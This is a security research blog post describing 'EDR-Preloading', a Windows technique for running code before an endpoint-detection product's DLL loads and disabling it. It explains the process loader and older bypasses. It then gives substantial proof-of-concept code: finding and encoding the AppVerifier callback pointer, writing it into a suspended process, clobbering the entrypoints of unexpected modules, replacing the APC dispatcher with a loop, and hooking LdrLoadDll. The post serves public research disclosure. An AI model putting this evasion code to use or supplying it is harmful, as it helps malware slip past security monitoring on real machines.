# https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html

<!DOCTYPE html><html lang="en" class="hydrated"><body class="is-in"><time datetime="2024-02-13T05:22:00+00:00"></time>
  
   
  
  
   
  
  
  <link rel="alternate" type="application/rss+xml" title="MalwareTech" href="https://malwaretech.com/feed.xml">

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Caveat:700%7CBarlow:400,500,600,700&amp;display=swap" rel="stylesheet">
  
  
  <link href="https://malwaretech.com/css/fontawesome.css" rel="stylesheet">
  <link href="https://malwaretech.com/css/all.css" rel="stylesheet">
  
  <!-- Ionicons -->
  
  
  
  
  

  



  <!-- begin header -->

<!-- end header -->

<div class="search">
  <div class="container">
    <div class="row">
      <div class="col col-12">
        <div class="search__box">
          <div class="search__close">
            <ion-icon title="Close" name="close-outline" role="img" class="md hydrated"><div class="icon-inner"><svg xmlns="http://www.w3.org/2000/svg" class="s-ion-icon"></svg></div></ion-icon>
          </div>
          <div class="search__group">
            <label for="js-search-input" class="screen-reader-text">Search for Blog</label>
            <input type="text" id="js-search-input" class="search__text" autocomplete="off" placeholder="Type to search...">
          </div>
          <div id="js-results-container" class="search-results-list"></div>
        </div>
      </div>
    </div>
  </div>
</div>

  <!-- begin content -->
  <main class="content" aria-label="Content">
    <!-- begin hero -->
<div class="container">
  <div class="row">
    <div class="col col-12">
      <div class="hero section">
        <div class="hero__nav">
  <div class="menu-overlay">
    
  </div>
  
</div>
        <div class="hero__inner">
          
        </div>
      </div>
    </div>
  </div>
</div>
<div class="container">
  <div class="row">
    <div class="col col-12 mt-2 mb-2">
      <a href="https://www.threatlocker.com/ztw26?utm_source=malwaretech&amp;utm_medium=sponsor&amp;utm_campaign=zerotrustworld26_q1_26&amp;utm_content=zerotrustworld26&amp;utm_term=display">
        <img class="banner-img xlarge" src="https://malwaretech.com/images/brands/ztw.jpg">
        <img class="banner-img large" src="https://malwaretech.com/images/brands/ztw.jpg">
      </a>
    </div>
  </div>
</div>
<!-- end hero -->

<div class="container">
  <div class="row">
    <div class="col col-8 col-d-12">
      <!-- begin post -->
      <article class="post section">

        <div class="post-head">
          <div class="post__meta">
            <span class="post__date">
              <time datetime="2024-02-13T05:22:00+00:00">Feb 13, 2024</time>
            </span>
            
            <div class="post-tags">
              
              <a href="https://malwaretech.com/tag/programming" class="post-tags__tag">Programming</a>
              
              <a href="https://malwaretech.com/tag/windows-internals" class="post-tags__tag">Windows Internals</a>
              
              <a href="https://malwaretech.com/tag/malware" class="post-tags__tag">Malware</a>
              
            </div>
            
          </div>
          <h1 class="post-title">Bypassing EDRs With EDR-Preloading</h1>

          <div class="post__author">
            
            <a href="https://marcushutchins.com/" class="article__author-image" style="background-image: url(/images/profile.png);" aria-label="Marcus Hutchins's Picture"></a>
            
            <div class="post__author-footer">
              <a href="https://marcushutchins.com/" class="article__author-link">Marcus Hutchins</a>
            </div>
          </div>
        </div>

        <div class="post__content">
          <p>Previously, I wrote <a href="https://malwaretech.com/2023/12/an-introduction-to-bypassing-user-mode-edr-hooks.html">an article</a> detailing how system calls can be utilized to bypass user mode EDR hooks.
Now, I want to introduce an alternative technique, “EDR-Preloading”, which involves running malicious code before the EDR’s DLL is loaded into the process, enabling us to prevent it from running at all.
By neutralizing the EDR module, we can freely call functions normally without having to worry about user mode hooks, therefore do not need to rely on direct or indirect syscalls.</p>

<p>This technique makes use of some assumptions and flaws in the way EDRs load their user mode component.
The EDR need to inject its DLL into every process in order to hook user mode function, but run the DLL too early and the process will crash, run it too late and the process could have already executed malicious code.
The sweet-spot most EDRs have gone with is starting their DLL as late in process initialization as possible, whilst still being able to do everything they need before the process entrypoint is called.</p>

<p>theoretically, all we need is to find a way to load code a little bit earlier in process initialization, then we can preempt the EDR.</p>

<h1 id="a-quick-overview-of-the-windows-process-loader">A quick overview of the Windows process loader</h1>
<p>To understand when EDR DLLs can and can’t load, we need to understand a bit about process initialization.</p>

<p>Whenever a new process is created, the kernel maps the target executable’s image into memory along with ntdll.dll.
A single thread is then created, which will eventually serve as the entrypoint thread.
At this time, the process is just an empty shell (the PEB, TEB, and imports are all uninitialized). Before the process entrypoint can be called, a fair bit of setup must be performed.</p>

<p>Whenever a new thread starts, its start address will be set to <code class="language-plaintext highlighter-rouge">ntdll!LdrInitializeThunk()</code>, which is responsible for calling <code class="language-plaintext highlighter-rouge">ntdll!LdrpInitialize()</code>.</p>

<p><code class="language-plaintext highlighter-rouge">ntdll!LdrpInitialize()</code> has two purposes:</p>
<ol>
  <li>Initialize the process (if it’s not already initialized)</li>
  <li>Initialize the thread</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">ntdll!LdrpInitialize()</code> first checks the global variable <code class="language-plaintext highlighter-rouge">ntdll!LdrpProcessInitialized</code>, which, if set to FALSE, will result in a call to <code class="language-plaintext highlighter-rouge">ntdll!LdrpInitializeProcess()</code> prior to thread initialization.</p>

<p><code class="language-plaintext highlighter-rouge">ntdll!LdrpInitializeProcess()</code> does what it says on the tin. It’ll set up the PEB, resolve the process imports, and load any required DLLs.</p>

<p>Right at the end of <code class="language-plaintext highlighter-rouge">ntdll!LdrpInitialize()</code> is a call to <code class="language-plaintext highlighter-rouge">ntdll!ZwTestAlert()</code>, which is the function used to run all the Asynchronous Procedure Calls (APCs) in the current thread’s APC queue.
EDR drivers that inject code into the target process and call it via <code class="language-plaintext highlighter-rouge">ntoskrnl!NtQueueApcThread()</code> will see their code executed here.</p>

<p>Once the thread and process initialization is complete and <code class="language-plaintext highlighter-rouge">ntdll!LdrpInitialize()</code> returns, <code class="language-plaintext highlighter-rouge">ntdll!LdrInitializeThunk()</code> will call <code class="language-plaintext highlighter-rouge">ntdll!ZwContinue()</code> which transfers execution back to the kernel.
The kernel will then set the thread instruction pointer to point to <code class="language-plaintext highlighter-rouge">ntdll!RtlUserThreadStart()</code>, which will call the executable entrypoint and the process’s life officially begin.</p>

<p><img src="https://malwaretech.com/images/bypassing-edrs-with-edr-preload/initialization_flow.png" alt="" data-action="zoom"> <em>Process initialization flow chart</em></p>

<h1 id="older-bypass-techniques-and-drawbacks">Older bypass techniques and drawbacks</h1>
<h2 id="early-apc-queuing">Early APC queuing</h2>
<p>Since APCs execute in First-in First-out order, it’s sometimes possible to preempt certain EDRs by queueing your own APC first.
Many EDRs monitor for new processes by register a kernel callback using <code class="language-plaintext highlighter-rouge">ntoskrnl!PsSetLoadImageNotifyRoutine()</code>.
Whenever a new process starts, it automatically loads ntdll.dll and kernel32.dll, so this serves as a good way to detect when new processes are being initialized. 
By starting a process in a suspended state, you can queue an APC prior to initialization, therefore ending up at the front of the queue.
This technique is sometimes referred to as “Early Bird injection”.</p>

<p>The problem with queuing APCs is they have long been used for code injection, therefore <code class="language-plaintext highlighter-rouge">ntdll!NtQueueApcThread()</code> is hooked and monitored by most EDRs.
Queuing an APC into a suspended process is highly suspicious and also well documented. It’s also possible the EDR could hook your
APC, re-order the APC queue, or do any matter of other things to ensure its DLL runs first.</p>

<h2 id="tls-callback">TLS Callback</h2>
<p>TLS callbacks are executed towards the end of <code class="language-plaintext highlighter-rouge">ntdll!LdrpInitializeProcess()</code>, but prior to <code class="language-plaintext highlighter-rouge">ntdll!ZwTestAlert()</code>, so, run before any APCs.
In cases where an application uses TLS callback, some EDRs may inject code to intercept the callback, or load the EDR DLL slightly earlier to compensate.
Much to my amazement, one EDRs I tested on was still bypassable using a TLS callback.</p>

<h1 id="finding-something-new">Finding something new</h1>
<p>My goal was simple, but actually not simple at all, and also very time-consuming.
I wanted to find a way to execute code before the entrypoint, before TLS callbacks, before everything that could possibly interfere with my code.
This meant reverse engineering the entire process and DLL loader to look for anything I could use. In the end, I found exactly what I needed.</p>

<h2 id="behold-the-appverifier-and-shimenginer-interfaces">Behold, the AppVerifier and ShimEnginer interfaces</h2>
<p>Long ago, Microsoft created a tool called AppVerifier, for, well, app verification. 
It’s designed to monitor applications at runtime for bugs, compatibility issues, and so on.
Much of AppVerifier’s functionality is facilitated by the addition of a whole host of new callbacks inside ntdll.</p>

<p>While reverse engineering the AppVerifier layer, I actually found two sets of useful callback (AppVerifier and ShimEngine).</p>
<p style="text-align: center;"><img src="https://malwaretech.com/images/bypassing-edrs-with-edr-preload/shim_interface_callbacks.png" alt="" data-action="zoom"> <em>Shim Engine related variables</em></p>
<p style="text-align: center;"><img src="https://malwaretech.com/images/bypassing-edrs-with-edr-preload/app_verifier_callbacks.png" alt="" data-action="zoom"> <em>App Verifier related variables</em></p>
<p>Two pointers that caught my eye were <code class="language-plaintext highlighter-rouge">ntdll!g_pfnSE_GetProcAddressForCaller</code> and <code class="language-plaintext highlighter-rouge">ntdll!AvrfpAPILookupCallbackRoutine</code>, part of the ShimEngine and AppVerifier layers respectively.
Both pointers are called toward the end of <code class="language-plaintext highlighter-rouge">ntdll!LdrGetProcedureAddressForCaller()</code>, which is the function used internally by GetProcAddress() to resolve the address of exported functions.</p>
<p style="text-align: center;"><img src="https://malwaretech.com/images/bypassing-edrs-with-edr-preload/api_lookup_callbacks.png" alt="" data-action="zoom"> <em>The code in LdrGetProcedureAddressForCaller() which implements the callbacks</em></p>
<p>These callbacks are perfect because LdrGetProcedureAddress() is guaranteed to be called by LdrpInitializeProcess() when it loads kernelbase.dll.
It’s also called any time anything tries to resolve an export with GetProcAddress() / LdrGetProcedureAddress(), including the EDR, which has a lot of fun potential.<br>
Even better, these pointers exist in a memory section that is writable prior to process initialization.</p>

<h2 id="deciding-on-a-callback-to-hook">Deciding on a callback to hook</h2>
<p>Whilst there were many good options, I decided to go with AvrfpAPILookupCallbackRoutine, which appears to have been introduced in Windows 8.1. 
Whilst I could use the older callbacks for compatibility with earlier Windows version, it’d be far more work and I wanted to keep my PoC simple.</p>

<p>The rest of the AppVerifer interface requires that you install a “Verifier Provider”, which requires a ton of memory manipulation.
The ShimEngine is slightly easier, but setting g_ShimsEnabled to TRUE enabled all callbacks, not just the one we want, so we must register every callback or the application will crash.</p>

<p>The newer AvrfpAPILookupCallbackRoutine is really nice for two reasons:</p>
<ol>
  <li>It can be enabled independently of the AppVerifier interface by setting <code class="language-plaintext highlighter-rouge">ntdll!AvrfpAPILookupCallbacksEnabled</code>, so no AppVerifier provider needed.</li>
  <li>Both <code class="language-plaintext highlighter-rouge">ntdll!AvrfpAPILookupCallbacksEnabled</code> and <code class="language-plaintext highlighter-rouge">ntdlL!AvrfpAPILookupCallbackRoutine</code> are easily locatable in memory, especially on Windows 10.</li>
</ol>

<h1 id="introducing-edr-preloader">Introducing EDR-Preloader</h1>
<p>For demonstration purposes I decided to build a proof-of-concept that utilizes the AvrfpAPILookupCallbackRoutine callback to load before the EDR DLL, then prevent it from loading.
Currently, I’ve only tested it on two major EDRs, but it should theoretically work against any EDR code injection with a few tweaks.</p>

<p>You can find the full source code at the bottom of the article.</p>

<h2 id="step-1-locating-the-appverifier-callback-pointer">Step 1: locating the AppVerifier callback pointer</h2>
<p>In order to set up a callback we need to set <code class="language-plaintext highlighter-rouge">ntdll!AvrfpAPILookupCallbacksEnabled</code> and <code class="language-plaintext highlighter-rouge">ntdll!AvrfpAPILookupCallbackRoutine</code>.
On Windows 10, both variables are located toward the beginning of ntdll’s <code class="language-plaintext highlighter-rouge">.mrdata</code> section, which is writable during process initialization.</p>

<p><code class="language-plaintext highlighter-rouge">ntdll!AvrfpAPILookupCallbacksEnabled</code> is found direct after <code class="language-plaintext highlighter-rouge">ntdll!LdrpMrdataBase</code> (though sometimes <code class="language-plaintext highlighter-rouge">ntdll!LdrpKnownDllDirectoryHandle</code> sits before it).</p>

<p>Both variables seem to always be exactly 8 bytes apart and in the same order.
In an initialized process, the layout should look something like this:</p>

<p>offset+0x00 - <code class="language-plaintext highlighter-rouge">ntdll!LdrpMrdataBase</code> (set to base address of .mrdata section)<br>
offset+0x08 - <code class="language-plaintext highlighter-rouge">ntdll!LdrpKnownDllDirectoryHandle</code> (set to a non-zero value)<br>
offset+0x10 - <code class="language-plaintext highlighter-rouge">ntdll!AvrfpAPILookupCallbacksEnabled</code> (set to zero)<br>
offset+0x18 - <code class="language-plaintext highlighter-rouge">ntdll!AvrfpAPILookupCallbackRoutine</code> (set to zero)</p>

<p>We can scan the .mrdata section in our own process for a pointer containing the section base address, then the first NULL value after that will be AvrfpAPILookupCallbackRoutine.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ULONG_PTR</span> <span class="nf">find_avrfp_address</span><span class="p">(</span><span class="n">ULONG_PTR</span> <span class="n">mrdata_base</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ULONG_PTR</span> <span class="n">address_ptr</span> <span class="o">=</span> <span class="n">mrdata_base</span> <span class="o">+</span> <span class="mh">0x280</span><span class="p">;</span>  <span class="c1">//the pointer we want is 0x280+ bytes in</span>
    <span class="n">ULONG_PTR</span> <span class="n">ldrp_mrdata_base</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">address_ptr</span> <span class="o">==</span> <span class="n">mrdata_base</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">ldrp_mrdata_base</span> <span class="o">=</span> <span class="n">address_ptr</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">address_ptr</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LPVOID</span><span class="p">);</span>  <span class="c1">// skip to the next pointer</span>
    <span class="p">}</span>
    
    <span class="n">address_ptr</span> <span class="o">=</span> <span class="n">ldrp_mrdata_base</span><span class="p">;</span>
    
    <span class="c1">// AvrfpAPILookupCallbackRoutine should be the first NULL pointer after LdrpMrdataBase</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">address_ptr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="n">address_ptr</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">address_ptr</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">LPVOID</span><span class="p">);</span>  <span class="c1">// skip to the next pointer</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="step-2-setting-up-the-callback-to-call-our-malicious-code">Step 2: setting up the callback to call our malicious code</h2>
<p>The easiest way to set up the callback is just launch a second copy of our own process in a suspended state.
Since ntdll is at the same address in every process, we only need to locate the callback pointer in our own process.
Once our process is launched but in a suspended state, we can just use WriteProcessMemory() to set the pointer.</p>

<p>We could also use this technique for process hollowing, shellcode injection, and more, since it allows us to execute code without creating/hijacking threads, or queuing an APC. But for this PoC we’ll keep it simple.</p>

<p>note: since many ntdll pointers are encrypted, we can’t just set the pointer to our target address. We have to encrypt it first.
Luckily, the key is the same value and stored at the same location across all processes.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">LPVOID</span> <span class="nf">encode_system_ptr</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">ptr</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// get pointer cookie from SharedUserData!Cookie (0x330)</span>
    <span class="n">ULONG</span> <span class="n">cookie</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">ULONG</span><span class="o">*</span><span class="p">)</span><span class="mh">0x7FFE0330</span><span class="p">;</span>

    <span class="c1">// encrypt our pointer so it'll work when written to ntdll</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">_rotr64</span><span class="p">(</span><span class="n">cookie</span> <span class="o">^</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ptr</span><span class="p">,</span> <span class="n">cookie</span> <span class="o">&amp;</span> <span class="mh">0x3F</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Now we can just write the pointer and set AvrfpAPILookupCallbacksEnabled to 1 using WriteProcessMemory():</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// ntdll pointer are encoded using the system pointer cookie located at SharedUserData!Cookie</span>
    <span class="n">LPVOID</span> <span class="n">callback_ptr</span> <span class="o">=</span> <span class="n">encode_system_ptr</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_LdrGetProcedureAddressCallback</span><span class="p">);</span>

    <span class="c1">// set ntdll!AvrfpAPILookupCallbacksEnabled to TRUE</span>
    <span class="kt">uint8_t</span> <span class="n">bool_true</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

    <span class="c1">// set ntdll!AvrfpAPILookupCallbackRoutine to our encoded callback address</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)(</span><span class="n">avrfp_address</span><span class="o">+</span><span class="mi">8</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">callback_ptr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONG_PTR</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Write 2 failed, error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">avrfp_address</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bool_true</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Write 3 failed, error: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>
</code></pre></div></div>

<h2 id="step-3-executing-the-callback--neutralizing-the-edr">Step 3: executing the callback &amp; neutralizing the EDR</h2>
<p>Once we call <code class="language-plaintext highlighter-rouge">ResumeThread()</code> on the suspended process, our callback will be executed every time <code class="language-plaintext highlighter-rouge">LdrpGetProcedureAddress()</code> is called, the first of which should be when <code class="language-plaintext highlighter-rouge">LdrpInitializeProcess()</code> loads kernelbase.dll.</p>

<p style="text-align: center;"><img src="https://malwaretech.com/images/bypassing-edrs-with-edr-preload/kernelbase_load.png" alt="" data-action="zoom"> <em>LdrpInitializeProcess calling LdrLoadDll to load kernelbase.dll</em></p>
<p>A word of warning: kernelbase.dll is not fully loaded when our callback is fired, and the trigger happens inside LdrLoadDll, thus the loader lock is still acquired.
Kernelbase not yet being loaded means we’re limited to calling only ntdll functions, and the loader lock prevents us from launching any threads or processes, as well as loading DLLs.</p>

<p>Since we’re highly restricted in what we can do, the simplest course of action is to just prevent the EDR DLL from loading, then wait until the process is fully initialized before starting the malware party.</p>

<p>To ensure proper neutralization of the EDRs I tested on, I took a multi-pronged approach.</p>

<h3 id="dll-clobbering">DLL Clobbering</h3>
<p>This early in the process lifecycle only ntdll.dll, kernel32.dll, and kernelbase.dll should be loaded.
Some EDRs may pre-emptively map their DLL into memory, but wait until later to call the entrypoint. 
Whilst we could probably unload these DLLs by calling <code class="language-plaintext highlighter-rouge">ntdll!LdrUnloadDll()</code> once the loader lock is released (or do it manually), a quick and dirty solution is to just clobber their entrypoints.</p>

<p>What we’ll do is iterate through the LDR module list and just replace the entrypoint address of any DLL that shouldn’t be there.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">EdrParadise</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// we'll replaced the EDR entrypoint with this equally useful function</span>
    <span class="c1">// todo: stop malware</span>

    <span class="k">return</span> <span class="n">ERROR_TOO_MANY_SECRETS</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="n">DisablePreloadedEdrModules</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">PEB</span><span class="o">*</span> <span class="n">peb</span> <span class="o">=</span> <span class="n">NtCurrentTeb</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">ProcessEnvironmentBlock</span><span class="p">;</span>
    <span class="n">LIST_ENTRY</span><span class="o">*</span> <span class="n">list_head</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">peb</span><span class="o">-&gt;</span><span class="n">Ldr</span><span class="o">-&gt;</span><span class="n">InMemoryOrderModuleList</span><span class="p">;</span>
    <span class="n">LIST_ENTRY</span><span class="o">*</span> <span class="n">list_entry</span> <span class="o">=</span> <span class="n">list_head</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">list_entry</span> <span class="o">!=</span> <span class="n">list_head</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">PLDR_DATA_TABLE_ENTRY2</span> <span class="n">module_entry</span> <span class="o">=</span> <span class="n">CONTAINING_RECORD</span><span class="p">(</span><span class="n">list_entry</span><span class="p">,</span> <span class="n">LDR_DATA_TABLE_ENTRY2</span><span class="p">,</span> <span class="n">InMemoryOrderLinks</span><span class="p">);</span>

        <span class="c1">// only the below DLLs should be loaded this early, anything else is probably a security product</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">SafeRuntime</span><span class="o">::</span><span class="n">wstring_compare_i</span><span class="p">(</span><span class="n">module_entry</span><span class="o">-&gt;</span><span class="n">BaseDllName</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="s">L"ntdll.dll"</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
            <span class="n">SafeRuntime</span><span class="o">::</span><span class="n">wstring_compare_i</span><span class="p">(</span><span class="n">module_entry</span><span class="o">-&gt;</span><span class="n">BaseDllName</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="s">L"kernel32.dll"</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
            <span class="n">SafeRuntime</span><span class="o">::</span><span class="n">wstring_compare_i</span><span class="p">(</span><span class="n">module_entry</span><span class="o">-&gt;</span><span class="n">BaseDllName</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="s">L"kernelbase.dll"</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>

            <span class="n">module_entry</span><span class="o">-&gt;</span><span class="n">EntryPoint</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">EdrParadise</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">list_entry</span> <span class="o">=</span> <span class="n">list_entry</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="disabling-the-apc-dispatcher">Disabling the APC dispatcher</h3>
<p>When APCs are queued to a thread they get processed by <code class="language-plaintext highlighter-rouge">ntdll!KiUserApcDispatcher()</code>, which runs the APC then calls <code class="language-plaintext highlighter-rouge">ntdll!NtContinue()</code> to return the thread to its original context.
By hooking KiUserApcDispatcher and replacing it with our own function that just calls NtContinue() on a loop, no APCs can ever be queued into our process (including those from the EDR’s kernel driver).</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; simple APC dispatcher that does everything except dispatch APCs</span>
<span class="nf">KiUserApcDispatcher</span> <span class="nv">PROC</span>
  <span class="nl">_loop:</span>
    <span class="nf">call</span> <span class="nv">GetNtContinue</span>
    <span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="nb">rsp</span>
    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mi">1</span>
    <span class="nf">call</span> <span class="nb">rax</span>
    <span class="nf">jmp</span> <span class="nv">_loop</span>
  <span class="nf">ret</span>
<span class="nf">KiUserApcDispatcher</span> <span class="nv">ENDP</span>
</code></pre></div></div>

<h3 id="proxying-ldrloaddll-calls">Proxying LdrLoadDll calls</h3>
<p>By placing a hook on <code class="language-plaintext highlighter-rouge">ntdll!LdrLoadDll()</code>, we can monitor which DLLs are being loaded. 
If any EDR tries to load its DLL using LdrLoadDll, we can unload or disable it.
Ideally we probably want to hook <code class="language-plaintext highlighter-rouge">ntdll!LdrpLoadDll()</code>, which is lower level and called directly by some EDRs, but for simplicity’s sake, we’ll just use LdrLoadDll.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// we can use this hook to prevent new modules from being loaded (though with both EDRs I tested, we don't need to)</span>
<span class="n">NTSTATUS</span> <span class="n">WINAPI</span> <span class="nf">LdrLoadDllHook</span><span class="p">(</span><span class="n">PWSTR</span> <span class="n">search_path</span><span class="p">,</span> <span class="n">PULONG</span> <span class="n">dll_characteristics</span><span class="p">,</span> <span class="n">UNICODE_STRING</span><span class="o">*</span> <span class="n">dll_name</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">base_address</span><span class="p">)</span> <span class="p">{</span>
    
    <span class="c1">//todo: DLL create a list of DLLs to either be allowed or disallowed</span>
    
    <span class="k">return</span> <span class="n">OriginalLdrLoadDll</span><span class="p">(</span><span class="n">search_path</span><span class="p">,</span> <span class="n">dll_characteristics</span><span class="p">,</span> <span class="n">dll_name</span><span class="p">,</span> <span class="n">base_address</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h1 id="final-thoughts">Final Thoughts</h1>
<p>While this PoC is only designed for Windows 10 64-bit, the technique should be viable on systems at least as early as Windows 7 (I haven’t checked XP or Vista).
However, finding the correct offsets is more difficult below Windows 10. For a more robust method, I recommend using a disassembler.
Either way, this was a pretty fun weekend project and hopefully someone is able to learn something from it.</p>

<p>If you enjoy my work please follow me on <a href="https://www.linkedin.com/in/malwaretech/">LinkedIn</a> and <a href="https://infosec.exchange/@malwaretech">Mastodon</a> for more.</p>

<p>You can find the full source code here: <a href="https://github.com/MalwareTech/EDR-Preloader">github.com/MalwareTech/EDR-Preloader</a></p>
<p style="text-align: center;"><img src="https://malwaretech.com/images/bypassing-edrs-with-edr-preload/poc.png" alt="" data-action="zoom"></p>


        </div>
        
<div class="post__share">
  <div class="share__head">
    <div class="share__title">Share this article</div>
  </div>
  <ul class="share__list list-reset">
    <li class="share__item">
      <a class="share__link share__linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html&amp;title=Bypassing%20EDRs%20With%20EDR-Preloading" title="Share on LinkedIn" rel="nofollow"><i class="fa-brands fa-linkedin"></i><span class="share-name">LinkedIn</span></a>
    </li>
    <ul class="share__list list-reset">
      <li class="share__item">
        <a class="share__link share__linkedin" href="https://bsky.app/intent/compose?text=https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html&amp;title=Bypassing%20EDRs%20With%20EDR-Preloading" title="Share on LinkedIn" rel="nofollow"><i class="fa-brands fa-bluesky"></i><span class="share-name">Bluesky</span></a>
      </li>
    </ul>
</ul></div>
        <!--<div class="post__navigation">
  
  <div class="post__prev">
    <a class="prev__image fadein" href="/2023/12/silly-edr-bypasses-and-where-to-find-them.html"
      style="background-image: url(/images/silly-edr-bypasses-and-where-to-find-them/cover.png)"></a>
    <div class="prev__box">
      <a class="post__nav post__nav__prev" href="/2023/12/silly-edr-bypasses-and-where-to-find-them.html"><i class="ion ion-ios-arrow-back"></i> Previous
        Page</a>
      <h4 class="post__nav__title"><a href="/2023/12/silly-edr-bypasses-and-where-to-find-them.html">Silly EDR Bypasses and Where To Find Them</a></h4>
    </div>
  </div>
  

  
  <div class="post__next">
    <div class="next__box">
      <a class="post__nav post__nav__next" href="/2024/08/exploiting-CVE-2024-38063.html">Next Page <i
          class="ion ion-ios-arrow-forward"></i></a>
      <h4 class="post__nav__title"><a href="/2024/08/exploiting-CVE-2024-38063.html">CVE-2024-38063 - Remotely Exploiting The Kernel Via IPv6</a></h4>
    </div>
    <a class="next__image fadein" href="/2024/08/exploiting-CVE-2024-38063.html"
      style="background-image: url(/images/CVE-2024-38063/cover.png)"></a>
  </div>
  
</div>-->

      </article>
      <!-- end post -->
      <!-- begin comments -->
<div id="disqus_thread" class="post__comments section">
  <div class="show-comments animate" style="text-align:center;">
    <button class="button button--dark button--middle" id="show-comments-button">Show Comments</button>
  </div>
  <div id="disqus_empty"></div>
</div>




<!-- end comments -->
    </div>
    <div class="col col-4 col-d-12">
      
<div class="widget-sidebar widget-featured ">
  <div class="widget__head section-top">
